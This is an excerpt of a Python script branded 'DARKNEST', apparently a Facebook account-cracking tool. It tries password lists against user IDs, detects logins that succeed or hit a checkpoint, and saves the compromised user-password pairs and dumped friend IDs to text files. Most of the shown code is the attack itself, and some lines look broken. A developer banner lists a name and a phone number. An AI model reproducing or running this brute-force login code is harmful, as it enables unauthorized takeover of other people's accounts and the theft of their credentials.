...
from concurrent.futures import ThreadPoolExecutor as DARKNEST
from concurrent.futures import ThreadPoolExecutor as DARKNEST
from datetime import datetime
from bs4 import BeautifulSoup
...
def main():
    ...
    if psy in ('0', '00'):
        exit('THANKS FOR USING DARKNEST TOOL')  
    else:
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mDARKNEST\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Id\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mDARKNEST-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mDARKNEST-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mDARKNEST\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('DARKNEST_Ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[DARKNET-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('DARKNEST_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[DARKNEST-CP] %s | %s%s      ' % (user,pw,tahun(user)))
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mDARKNEST\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
...
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║➣ DEVOLPER   :          DRUNK01 ║
║➣ FACEBOOK   :          Rafsanur Rafin     ║
║➣ WHATSAPP   :          01324313100         ║
║➣ GITHUB     :          DUNK01          ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
